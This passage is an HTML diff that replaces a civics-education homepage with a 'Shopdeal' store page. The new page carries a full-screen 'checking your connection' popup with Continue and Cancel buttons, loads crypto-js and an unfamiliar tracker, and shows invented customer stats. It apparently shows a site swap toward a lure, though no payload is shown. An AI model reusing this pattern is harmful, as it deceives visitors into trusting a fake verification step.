@@ -1,264 +1,749 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Civic Sparrow | Plain-Language Civics Lessons, Quiz & Bill of Rights Guide</title>
-<meta name="description" content="Learn how U.S. government works with free, nonpartisan civics lessons: the three branches, Bill of Rights explorer, how a bill becomes law, a civics quiz and glossary.">
-<meta name="robots" content="index, follow">
-<link rel="canonical" href="https://civicsparrow.com/">
-<meta property="og:type" content="website">
-<meta property="og:site_name" content="Civic Sparrow">
-<meta property="og:title" content="Civic Sparrow | Plain-Language Civics Lessons, Quiz & Bill of Rights Guide">
-<meta property="og:description" content="Learn how U.S. government works with free, nonpartisan civics lessons: the three branches, Bill of Rights explorer, how a bill becomes law, a civics quiz and glossary.">
-<meta property="og:url" content="https://civicsparrow.com/">
-<meta property="og:image" content="https://images.pexels.com/photos/8419491/pexels-photo-8419491.jpeg?auto=compress&cs=tinysrgb&w=1200">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="theme-color" content="#14213D">
-<link rel="icon" href="assets/images/favicon.svg" type="image/svg+xml">
-<link rel="preconnect" href="https://images.pexels.com">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Bitter:wght@600;700&family=Public+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="assets/css/style.css">
-<!-- Google tag (gtag.js) with Consent Mode v2 -->
-<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('consent','default',{ad_storage:'denied',ad_user_data:'denied',ad_personalization:'denied',analytics_storage:'denied',wait_for_update:500});</script>
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-<script>gtag('js',new Date());gtag('config','G-0LY0HY7L01');</script>
-<script type="application/ld+json">{"@context": "https://schema.org", "@type": "EducationalOrganization", "name": "Civic Sparrow", "url": "https://civicsparrow.com/", "email": "hello@civicsparrow.com", "telephone": "+1-888-777-5845", "address": {"@type": "PostalAddress", "streetAddress": "181 Mercer Street", "addressLocality": "New York", "addressRegion": "NY", "postalCode": "10012", "addressCountry": "US"}}</script><script type="application/ld+json">{"@context": "https://schema.org", "@type": "FAQPage", "mainEntity": [{"@type": "Question", "name": "Is Civic Sparrow nonpartisan?", "acceptedAnswer": {"@type": "Answer", "text": "Yes. We explain how government works, what documents say and how processes run. We don't endorse candidates, parties or positions, and where people reasonably disagree, we present the main viewpoints fairly."}}, {"@type": "Question", "name": "Who is Civic Sparrow for?", "acceptedAnswer": {"@type": "Answer", "text": "Middle and high school students, teachers, homeschooling families and adults who want a clear refresher on civics. The language is written to be accessible to readers from about age 12 upward."}}, {"@type": "Question", "name": "Can I use these materials in my classroom?", "acceptedAnswer": {"@type": "Answer", "text": "Yes. Teachers may use our pages, quiz and glossary with students free of charge for non-commercial educational purposes. Please see our Terms & Conditions for details."}}, {"@type": "Question", "name": "Where does your information come from?", "acceptedAnswer": {"@type": "Answer", "text": "We rely on primary sources such as the U.S. Constitution and official government websites, and on respected educational references. Our Editorial Policy explains how we check and update content."}}, {"@type": "Question", "name": "Is this legal advice?", "acceptedAnswer": {"@type": "Answer", "text": "No. Civic Sparrow provides general educational information. For advice about a specific legal situation, please consult a qualified attorney."}}]}</script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Help0x0x-MDs</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+  
+    :root{
+      --ink:#0b1020;
+      --muted:#64748b;
+      --line:#e9ebf2;
+      --surface:#f8fafc;
+      --brand:#6d28d9;
+      --brand-dark:#5b21b6;
+      --accent:#db2777;
+      --radius:18px;
+      --shadow-sm:0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
+      --shadow-md:0 12px 30px -14px rgba(16,24,40,.22);
+      --shadow-lg:0 28px 60px -24px rgba(16,24,40,.32);
+      --max:1180px;
+    }
+
+    *,*::before,*::after{ box-sizing:border-box; }
+    html{ scroll-behavior:smooth; }
+    body{
+      margin:0;
+      font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+      color:var(--ink);
+      background:#fff;
+      line-height:1.6;
+      -webkit-font-smoothing:antialiased;
+    }
+    img{ max-width:100%; display:block; }
+    a{ color:inherit; text-decoration:none; }
+    button{ font:inherit; }
+    ul{ list-style:none; margin:0; padding:0; }
+
+    .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }
+
+    /* ============================================================
+       LOADING POPUP
+       ============================================================ */
+    .popup{
+      position:fixed; inset:0; z-index:9999;
+      display:flex; align-items:center; justify-content:center;
+      background:#fff; padding:24px;
+    }
+    .popup-content{
+      width:100%; max-width:560px;
+      text-align:center;
+      animation:popIn .5s cubic-bezier(.2,.8,.3,1) both;
+    }
+    @keyframes popIn{
+      from{ opacity:0; transform:translateY(14px) scale(.98); }
+      to{ opacity:1; transform:none; }
+    }
+    .loading-gif{
+      width:120px; height:120px;
+      margin:0 auto 26px;
+    }
+    .popup-title{
+      font-size:clamp(1.3rem,2.6vw,1.6rem);
+      font-weight:800; letter-spacing:-.025em;
+      margin:0 0 8px;
+    }
+    .popup-content p.sub{
+      margin:0 0 32px;
+      color:var(--muted);
+      font-size:.95rem;
+      font-weight:500;
+    }
+    .buttons{
+      display:flex; justify-content:center; gap:14px; flex-wrap:wrap;
+    }
+    .buttons button{
+      min-width:152px;
+      padding:14px 30px;
+      border:0; border-radius:13px;
+      cursor:pointer; font-weight:700; font-size:1rem;
+      transition:transform .18s ease, box-shadow .18s ease, background .18s ease;
+    }
+    #cancelBtn{ background:#f1f5f9; color:#334155; }
+    #cancelBtn:hover{ background:#e2e8f0; }
+    #continueBtn{
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff;
+      box-shadow:0 16px 30px -14px rgba(109,40,217,.85);
+    }
+    #continueBtn:hover{ transform:translateY(-2px); }
+
+    .hint{
+      background:linear-gradient(90deg,#1e1b4b,#4c1d95 45%,#831843);
+      color:#ede9fe;
+      text-align:center;
+      font-size:.82rem;
+      font-weight:600;
+      letter-spacing:.02em;
+      padding:11px 20px;
+      min-height:42px;
+      display:flex; align-items:center; justify-content:center;
+      gap:10px;
+    }
+
+    .nav{
+      position:sticky; top:0; z-index:80;
+      display:flex; align-items:center; gap:26px;
+      height:72px;
+      padding:0 max(24px, calc((100vw - var(--max)) / 2));
+      background:rgba(255,255,255,.86);
+      backdrop-filter:blur(16px);
+      -webkit-backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--line);
+    }
+    .brand{
+      display:flex; align-items:center; gap:11px;
+      font-weight:800; font-size:1.12rem;
+      letter-spacing:-.025em; white-space:nowrap;
+    }
+    .brand-mark{
+      width:36px; height:36px; flex:none;
+      display:grid; place-items:center;
+      border-radius:11px; font-size:1rem;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      box-shadow:0 10px 22px -10px rgba(109,40,217,.9);
+    }
+
+    .links{ display:flex; gap:6px; }
+    .links a{
+      font-size:.9rem; font-weight:500; color:#4b5563;
+      padding:8px 14px; border-radius:10px;
+      transition:color .18s ease, background .18s ease;
+    }
+    .links a:hover{ color:var(--brand); background:#f5f3ff; }
+
+    .clock{
+      margin-left:auto;
+      display:inline-flex; align-items:center; gap:6px;
+      font-size:.78rem; font-weight:600; color:var(--brand-dark);
+      background:#f5f3ff; border:1px solid #ede9fe;
+      padding:7px 13px; border-radius:999px; white-space:nowrap;
+    }
+    .cart-btn{
+      display:inline-flex; align-items:center; gap:8px;
+      border:0; cursor:pointer;
+      background:var(--ink); color:#fff;
+      font-weight:600; font-size:.88rem;
+      padding:10px 18px; border-radius:999px;
+      transition:transform .18s ease, background .18s ease;
+    }
+    .cart-btn:hover{ background:var(--brand); transform:translateY(-1px); }
+    .cart-btn .badge{
+      background:#fff; color:var(--ink);
+      border-radius:999px; min-width:20px; height:20px;
+      display:grid; place-items:center;
+      padding:0 6px; font-size:.72rem; font-weight:800;
+    }
+
+    @media (max-width:900px){
+      .links{ display:none; }
+      .clock{ display:none; }
+    }
+    @media (max-width:560px){
+      .nav{ gap:14px; height:66px; padding-inline:18px; }
+      .cart-btn{ padding:9px 14px; font-size:.82rem; }
+    }
+
+    /* ============================================================
+       HERO
+       ============================================================ */
+    .hero{
+      display:grid;
+      grid-template-columns:1.03fr .97fr;
+      gap:60px; align-items:center;
+      padding:76px max(24px, calc((100vw - var(--max)) / 2)) 68px;
+      background:
+        radial-gradient(900px 420px at 8% -20%, rgba(109,40,217,.14), transparent 62%),
+        radial-gradient(760px 420px at 98% -6%, rgba(219,39,119,.12), transparent 58%),
+        linear-gradient(180deg,#fbfaff,#fff);
+    }
+    @media (max-width:960px){
+      .hero{ grid-template-columns:1fr; gap:44px; padding-top:52px; padding-bottom:52px; }
+    }
+
+    .eyebrow{
+      display:inline-flex; align-items:center; gap:8px;
+      background:#fff; border:1px solid #ede9fe;
+      color:var(--brand-dark);
+      font-size:.78rem; font-weight:700;
+      letter-spacing:.06em; text-transform:uppercase;
+      padding:7px 15px; border-radius:999px;
+      box-shadow:var(--shadow-sm);
+      margin-bottom:20px;
+    }
+    .eyebrow .dot{
+      width:7px; height:7px; border-radius:50%;
+      background:var(--accent);
+      box-shadow:0 0 0 4px rgba(219,39,119,.16);
+    }
+
+    .hero-text h1{
+      font-size:clamp(2.2rem,5vw,3.4rem);
+      line-height:1.08; letter-spacing:-.035em;
+      font-weight:900; margin:0 0 18px;
+    }
+    .hero-text h1 span{
+      background:linear-gradient(115deg,var(--brand),var(--accent));
+      -webkit-background-clip:text; background-clip:text; color:transparent;
+    }
+    .hero-text p{
+      font-size:1.05rem; color:var(--muted);
+      max-width:490px; margin:0 0 30px;
+    }
+
+    .cta{
+      display:inline-flex; align-items:center; gap:9px;
+      padding:15px 30px; border-radius:999px;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff; font-weight:700; font-size:.95rem;
+      box-shadow:0 16px 32px -16px rgba(109,40,217,.9);
+      transition:transform .18s ease, box-shadow .18s ease;
+    }
+    .cta:hover{ transform:translateY(-2px); box-shadow:0 22px 40px -18px rgba(109,40,217,.95); }
+
+    .hero-stats{
+      display:flex; gap:34px; flex-wrap:wrap;
+      margin-top:40px; padding-top:26px;
+      border-top:1px solid var(--line);
+    }
+    .hero-stats strong{
+      display:block; font-size:1.35rem; font-weight:800; letter-spacing:-.02em;
+    }
+    .hero-stats span{ font-size:.82rem; color:var(--muted); }
+
+    .hero-img{
+      width:100%; aspect-ratio:5/4; object-fit:cover;
+      border-radius:26px;
+      box-shadow:var(--shadow-lg);
+    }
+
+    /* ============================================================
+       TRUST STRIP
+       ============================================================ */
+    .trust{
+      border-block:1px solid var(--line);
+      background:var(--surface);
+    }
+    .trust-grid{
+      display:grid; grid-template-columns:repeat(4,1fr);
+      gap:10px; padding:22px 0;
+    }
+    .trust-item{
+      display:flex; align-items:center; justify-content:center; gap:9px;
+      font-size:.85rem; font-weight:600; color:#475569;
+      padding:6px 10px; border-right:1px solid var(--line);
+    }
+    .trust-item:last-child{ border-right:0; }
+    .trust-item span{ font-size:1.05rem; }
+    @media (max-width:860px){
+      .trust-grid{ grid-template-columns:repeat(2,1fr); gap:14px; }
+      .trust-item{ border-right:0; justify-content:flex-start; }
+    }
+
+    /* ============================================================
+       SECTIONS
+       ============================================================ */
+    .section{ padding:76px 0; }
+    .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
+    .section-head .kicker{
+      display:inline-block;
+      font-size:.76rem; font-weight:800;
+      letter-spacing:.12em; text-transform:uppercase;
+      color:var(--brand); margin-bottom:10px;
+    }
+    .section-head h2{
+      font-size:clamp(1.6rem,3.2vw,2.2rem);
+      font-weight:900; letter-spacing:-.03em;
+      margin:0 0 10px; line-height:1.15;
+    }
+    .section-head p{ margin:0; color:var(--muted); font-size:.97rem; }
+
+
+    .grid{
+      display:grid; gap:24px;
+      grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
+    }
+    .card{
+      display:flex; flex-direction:column;
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius); overflow:hidden;
+      transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
+    }
+    .card:hover{
+      transform:translateY(-6px);
+      box-shadow:var(--shadow-lg);
+      border-color:transparent;
+    }
+    .card-media{
+      position:relative; aspect-ratio:4/3;
+      overflow:hidden; background:#f1f5f9;
+    }
+    .card-media img{
+      width:100%; height:100%; object-fit:cover;
+      transition:transform .55s cubic-bezier(.2,.7,.3,1);
+    }
+    .card:hover .card-media img{ transform:scale(1.07); }
+
+    .card .badge{
+      position:absolute; top:12px; left:12px;
+      font-size:.68rem; font-weight:800; letter-spacing:.06em;
+      text-transform:uppercase; color:#fff;
+      padding:6px 11px; border-radius:999px;
+      background:var(--ink);
+    }
+    .card .badge--sale{ background:var(--accent); }
+    .card .badge--new{ background:#0ea5e9; }
+
+    .card .body{
+      padding:16px 18px 18px;
+      display:flex; flex-direction:column; flex:1;
+    }
+    .card .cat{
+      font-size:.7rem; font-weight:700; letter-spacing:.1em;
+      text-transform:uppercase; color:#94a3b8; margin-bottom:6px;
+    }
+    .card h3{
+      margin:0 0 8px; font-size:1rem; font-weight:700; letter-spacing:-.015em;
+    }
+    .price-row{
+      display:flex; align-items:baseline; gap:8px;
+      margin-top:auto; padding-top:6px;
+    }
+    .card .price{
+      font-size:1.12rem; font-weight:800;
+      letter-spacing:-.02em; color:var(--ink);
+    }
+    .card .old{
+      font-size:.85rem; color:#a3aab8;
+      text-decoration:line-through; font-weight:500;
+      margin:0;
+    }
+    .save{
+      margin-left:auto;
+      font-size:.7rem; font-weight:800;
+      color:#047857; background:#ecfdf5;
+      padding:3px 8px; border-radius:999px;
+    }
+
+    .add{
+      margin-top:14px; width:100%;
+      display:inline-flex; align-items:center; justify-content:center; gap:8px;
+      border:1px solid var(--ink); background:#fff; color:var(--ink);
+      font-weight:700; font-size:.88rem;
+      padding:11px; border-radius:11px; cursor:pointer;
+      transition:background .2s ease, color .2s ease, transform .18s ease;
+    }
+    .add:hover{ background:var(--ink); color:#fff; transform:translateY(-1px); }
+    .add:active{ transform:translateY(0); }
+
+  
+    .about{
+      background:var(--surface);
+      border-block:1px solid var(--line);
+    }
+    .features{
+      display:grid; gap:22px;
+      grid-template-columns:repeat(auto-fit,minmax(210px,1fr));
+    }
+    .feature{
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius);
+      padding:28px 24px;
+      text-align:left;
+      transition:transform .22s ease, box-shadow .22s ease;
+    }
+    .feature:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); }
+    .feature span{
+      display:grid; place-items:center;
+      width:48px; height:48px;
+      border-radius:14px; font-size:1.3rem;
+      background:linear-gradient(135deg,#f5f3ff,#fdf2f8);
+      border:1px solid #ede9fe;
+      margin-bottom:16px;
+    }
+    .feature h3{ margin:0 0 6px; font-size:1rem; font-weight:800; letter-spacing:-.015em; }
+    .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }
+
+    /* ============================================================
+       FOOTER
+       ============================================================ */
+    .footer{
+      background:#0b1020;
+      color:#94a3b8;
+      text-align:center;
+      padding:44px 24px;
+      font-size:.85rem;
+    }
+    .footer .fbrand{
+      display:inline-flex; align-items:center; gap:10px;
+      color:#fff; font-weight:800; font-size:1rem;
+      letter-spacing:-.02em; margin-bottom:10px;
+    }
+    .footer p{ margin:0 0 6px; }
+    .footer small{ color:#64748b; font-size:.78rem; }
+
+  
+    @media (prefers-reduced-motion:reduce){
+      *{ animation-duration:.001ms !important; transition-duration:.001ms !important; }
+      html{ scroll-behavior:auto; }
+    }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
-<a class="skip" href="#main">Skip to content</a>
-<div class="utility"><div class="wrap"><span>Free, nonpartisan civics learning for students, teachers and families</span><span class="hide-sm"><a href="mailto:hello@civicsparrow.com">hello@civicsparrow.com</a> · <a href="tel:+18887775845">+1-888-777-5845</a></span></div></div>
-<header class="site-header"><div class="wrap hdr">
-  <a class="logo" href="index.php" aria-label="Civic Sparrow home"><svg viewBox="0 0 48 48" aria-hidden="true"><circle cx="24" cy="24" r="23" fill="#E9B44C"/><path d="M12 29c4-9 12-13 20-11l6-3-2 6c1 6-4 12-12 13-5 1-9-1-12-5z" fill="#14213D"/><path d="M20 25c3 3 8 3 11 0" stroke="#A0785A" stroke-width="2.4" fill="none" stroke-linecap="round"/><circle cx="31" cy="20.5" r="1.4" fill="#fff"/><path d="M22 34l-2 6M27 34l1 6" stroke="#14213D" stroke-width="1.8" stroke-linecap="round"/></svg><span><b>Civic Sparrow</b><small>Civics made clear</small></span></a>
-  <nav class="nav" id="nav" aria-label="Main"><ul><li><a href="index.php" aria-current="page">Home</a></li><li><a href="about.html">About</a></li><li><a href="services.html">Services</a></li><li><a href="contact.html">Contact</a></li></ul></nav>
-  <button class="burger" type="button" aria-label="Menu" aria-expanded="false" aria-controls="nav"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</div></header>
-<main id="main">
-<!-- 1 HERO -->
-<section class="hero" aria-labelledby="h1">
-  <div class="wrap hero-grid">
-    <div>
-      <span class="tag">Civics, explained without the jargon</span>
-      <h1 id="h1">Understand how your government <u>actually works</u>.</h1>
-      <p class="lead">Civic Sparrow is a free, nonpartisan learning space for students, teachers and curious adults. We explain the Constitution, the branches of government and how people take part in public life — in plain, friendly language.</p>
-      <div class="hero-actions"><a class="btn" href="#units">Start learning</a><a class="btn btn-ghost" href="#quiz-sec">Take the 10-question quiz</a></div>
-    </div>
-    <div class="hero-card">
-      <img class="main" src="https://images.pexels.com/photos/8419491/pexels-photo-8419491.jpeg?auto=compress&cs=tinysrgb&w=900" alt="Teacher leading a lively classroom discussion with engaged students" width="900" height="970" fetchpriority="high">
-      <img class="bird" src="https://images.pexels.com/photos/295767/pexels-photo-295767.jpeg?auto=compress&cs=tinysrgb&w=500" alt="House sparrows perched together on a metal fence" width="500" height="500">
-      <div class="note"><b>Why a sparrow?</b>Sparrows are small, common and found in almost every community — just like the everyday people who make democracy work.</div>
-    </div>
-  </div>
-</section>
 
-<!-- 2 BAND -->
-<section class="band" aria-label="What you'll find here"><ul>
-  <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" aria-hidden="true"><path d="M4 19V5a2 2 0 0 1 2-2h13v16H6a2 2 0 0 0-2 2z"/><path d="M8 7h7M8 11h7"/></svg><div><b>6 learning units</b><span>From founding ideas to local action</span></div></li>
-  <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M9 12l2 2 4-4"/></svg><div><b>Nonpartisan</b><span>Facts and processes, not opinions</span></div></li>
-  <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" aria-hidden="true"><path d="M9 4h6M12 4v4M5 20h14l-2-12H7z"/></svg><div><b>Interactive tools</b><span>Quiz, rights explorer and glossary</span></div></li>
-  <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" aria-hidden="true"><path d="M3 21h18M5 21V10l7-5 7 5v11M9 21v-6h6v6"/></svg><div><b>Classroom ready</b><span>Free to use with your students</span></div></li>
-</ul></section>
-
-<!-- 3 LEARNING UNITS -->
-<section class="sec" id="units" aria-labelledby="u-h">
-  <div class="wrap">
-    <div class="head"><span class="tag">Learning units</span><h2 id="u-h">Six units that build real civic understanding</h2><p>Each unit starts with the big idea, explains it with everyday examples, and ends with questions to discuss. Work through them in order or jump to what you need.</p></div>
-    <div class="paths">
-      <article class="path"><img src="https://images.pexels.com/photos/19574309/pexels-photo-19574309.jpeg?auto=compress&cs=tinysrgb&w=700" alt="The United States Capitol building in Washington, D.C. under a blue sky" width="700" height="394" loading="lazy"><div class="b"><h3>Foundations of government</h3><p>Why governments exist, what a constitution does and the ideas that shaped the United States.</p><ul><li>Popular sovereignty and the rule of law</li><li>Separation of powers</li><li>Federalism in daily life</li></ul></div></article>
-      <article class="path"><img src="https://images.pexels.com/photos/16603615/pexels-photo-16603615.jpeg?auto=compress&cs=tinysrgb&w=700" alt="Neoclassical courthouse with tall stone columns" width="700" height="394" loading="lazy"><div class="b"><h3>Rights &amp; responsibilities</h3><p>What the Bill of Rights protects, how courts interpret it, and the responsibilities that come with citizenship.</p><ul><li>Freedoms of speech and religion</li><li>Due process and fair trials</li><li>Jury service and civic duty</li></ul></div></article>
-      <article class="path"><img src="https://images.pexels.com/photos/261841/pexels-photo-261841.jpeg?auto=compress&cs=tinysrgb&w=700" alt="Man reading a newspaper on a park bench" width="700" height="394" loading="lazy"><div class="b"><h3>News &amp; media literacy</h3><p>How to evaluate sources, recognize misleading claims and follow public issues with confidence.</p><ul><li>Checking who's behind a source</li><li>Facts, opinions and analysis</li><li>Reading statistics carefully</li></ul></div></article>
-      <article class="path"><img src="https://images.pexels.com/photos/39778154/pexels-photo-39778154.jpeg?auto=compress&cs=tinysrgb&w=700" alt="Volunteers working together on a community garden project" width="700" height="394" loading="lazy"><div class="b"><h3>Community participation</h3><p>The many ways people shape their communities — volunteering, public comment, petitions and civil discussion.</p><ul><li>Attending a public meeting</li><li>Writing to an elected official</li><li>Organizing a service project</li></ul></div></article>
-      <article class="path"><img src="https://images.pexels.com/photos/1550337/pexels-photo-1550337.jpeg?auto=compress&cs=tinysrgb&w=700" alt="Silhouette of a hand placing a ballot into a ballot box" width="700" height="394" loading="lazy"><div class="b"><h3>How elections work</h3><p>Registration, primaries, general elections and the Electoral College — explained step by step, without spin.</p><ul><li>Who can vote and how to register</li><li>Primaries versus general elections</li><li>How votes are counted</li></ul></div></article>
-      <article class="path"><img src="https://images.pexels.com/photos/34945286/pexels-photo-34945286.jpeg?auto=compress&cs=tinysrgb&w=700" alt="Aerial view of a state capitol building surrounded by trees" width="700" height="394" loading="lazy"><div class="b"><h3>State &amp; local government</h3><p>Governors, legislatures, city councils and school boards: the level of government closest to your daily life.</p><ul><li>What counties and cities do</li><li>How school boards make decisions</li><li>Finding your local representatives</li></ul></div></article>
-    </div>
-  </div>
-</section>
-
-<!-- 4 THREE BRANCHES -->
-<section class="sec white" id="branches" aria-labelledby="br-h">
-  <div class="wrap">
-    <div class="head"><span class="tag">Interactive explainer</span><h2 id="br-h">The three branches, side by side</h2><p>The Constitution divides federal power among three branches so no single group holds too much. Select a branch to see what it does and how it checks the others.</p></div>
-    <div class="branches">
-      <div class="branch-tabs" role="tablist" aria-label="Branches of government" aria-orientation="vertical">
-        <button role="tab" id="bt-l" aria-controls="bp-l" aria-selected="true"><b>Legislative</b>Makes the laws</button>
-        <button role="tab" id="bt-e" aria-controls="bp-e" aria-selected="false" tabindex="-1"><b>Executive</b>Carries out the laws</button>
-        <button role="tab" id="bt-j" aria-controls="bp-j" aria-selected="false" tabindex="-1"><b>Judicial</b>Interprets the laws</button>
-        <img src="https://images.pexels.com/photos/3751006/pexels-photo-3751006.jpeg?auto=compress&cs=tinysrgb&w=600" alt="Courthouse with columns and wide stone steps covered in snow" width="600" height="375" loading="lazy">
-      </div>
-      <div class="branch-panel" role="tabpanel" id="bp-l" aria-labelledby="bt-l">
-        <h3>Legislative branch — Congress</h3>
-        <p>Described in Article I of the Constitution, Congress writes federal laws, oversees federal agencies and has the power to declare war. It has two chambers, which is why it's called a bicameral legislature.</p>
-        <div class="facts"><div class="fact"><b>Senate: 100 members</b>Two per state, six-year terms</div><div class="fact"><b>House: 435 members</b>Seats by population, two-year terms</div></div>
-        <p><strong>Checks on other branches:</strong> Congress can override a presidential veto with a two-thirds vote in both chambers, the Senate confirms federal judges and many presidential appointments, and Congress can impeach and remove officials.</p>
-      </div>
-      <div class="branch-panel" role="tabpanel" id="bp-e" aria-labelledby="bt-e" hidden>
-        <h3>Executive branch — the President</h3>
-        <p>Described in Article II, the executive branch enforces federal laws. It is led by the President, supported by the Vice President, the Cabinet and federal departments and agencies.</p>
-        <div class="facts"><div class="fact"><b>Four-year term</b>Limited to two elected terms (22nd Amendment)</div><div class="fact"><b>Minimum age 35</b>Must be a natural-born citizen</div></div>
-        <p><strong>Checks on other branches:</strong> the President can veto bills passed by Congress and nominates federal judges, including Supreme Court justices, who must then be confirmed by the Senate.</p>
-      </div>
-      <div class="branch-panel" role="tabpanel" id="bp-j" aria-labelledby="bt-j" hidden>
-        <h3>Judicial branch — the courts</h3>
-        <p>Described in Article III, the federal courts decide cases involving the Constitution and federal law. The Supreme Court is the highest court in the country, with lower district and appeals courts below it.</p>
-        <div class="facts"><div class="fact"><b>Nine justices</b>The number set by Congress since 1869</div><div class="fact"><b>Life tenure</b>Federal judges serve “during good behavior”</div></div>
-        <p><strong>Checks on other branches:</strong> through judicial review, established in <em>Marbury v. Madison</em> (1803), courts can rule that laws or executive actions conflict with the Constitution.</p>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <h2 class="popup-title">Loading... Please wait.</h2>
+      <p class="sub">We're checking your connection.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
       </div>
     </div>
   </div>
-</section>
+  
+  <div id="shop">
+    <div class="hint">🛍️ Shopdeal — Summer Sale is live · Up to 50% off</div>
 
-<!-- 5 BILL OF RIGHTS -->
-<section class="sec" id="rights" aria-labelledby="ri-h">
-  <div class="wrap split">
-    <div>
-      <span class="tag">Bill of Rights explorer</span>
-      <h2 id="ri-h">The first ten amendments, in plain English</h2>
-      <p class="lead">Ratified in 1791, the Bill of Rights protects individual freedoms from government overreach. Pick an amendment to read a short summary and an everyday example.</p>
-      <div id="amendments">
-        <div class="amend-nums" role="group" aria-label="Choose an amendment"></div>
-        <div class="amend-card" aria-live="polite"><h3 id="am-title"></h3><p class="plain" id="am-plain"></p><p class="ex" id="am-ex"></p></div>
+    <header class="nav">
+      <div class="brand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
+
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <span class="eyebrow"><span class="dot"></span> Summer Sale · Up to 50% Off</span>
+        <h1>Everyday essentials, <span>beautifully priced.</span></h1>
+        <p>Trendy products, free stock photos, all on a single page. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now →</a>
+
+        <div class="hero-stats">
+          <div><strong>12,480+</strong><span>Happy customers</span></div>
+          <div><strong>4.9 / 5</strong><span>Average rating</span></div>
+          <div><strong>48 hrs</strong><span>US delivery</span></div>
+        </div>
       </div>
-      <p class="muted" style="font-size:.9rem;margin-top:16px">Summaries simplify the original text. You can read the full Constitution at <a href="https://www.archives.gov/founding-docs/constitution-transcript" target="_blank" rel="noopener">the National Archives</a>.</p>
-    </div>
-    <img class="pic tall" src="https://images.pexels.com/photos/3832033/pexels-photo-3832033.jpeg?auto=compress&cs=tinysrgb&w=900" alt="Hands holding a book marked with colorful sticky notes" width="900" height="1125" loading="lazy">
-  </div>
-</section>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/900/720" alt="hero" />
+    </section>
 
-<!-- 6 HOW A BILL BECOMES LAW -->
-<section class="sec navy" aria-labelledby="bl-h">
-  <div class="wrap">
-    <div class="head center"><span class="tag">Step by step</span><h2 id="bl-h">How a bill becomes a federal law</h2><p>Most bills never make it all the way. Here is the path the ones that do usually follow.</p></div>
-    <ol class="flow">
-      <li><h3>Introduced</h3><p>A member of Congress introduces the bill in the House or Senate.</p></li>
-      <li><h3>Committee</h3><p>A committee studies it, holds hearings and may amend it.</p></li>
-      <li><h3>Floor vote</h3><p>The full chamber debates and votes on the bill.</p></li>
-      <li><h3>Other chamber</h3><p>The second chamber repeats the process and may make changes.</p></li>
-      <li><h3>Agreement</h3><p>Both chambers must pass identical text, sometimes via a conference committee.</p></li>
-      <li><h3>President</h3><p>The President signs it into law or vetoes it; Congress can override with two-thirds votes.</p></li>
-    </ol>
-  </div>
-</section>
+    <!-- Histats.com  START  (aync)-->
+   <!--  <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
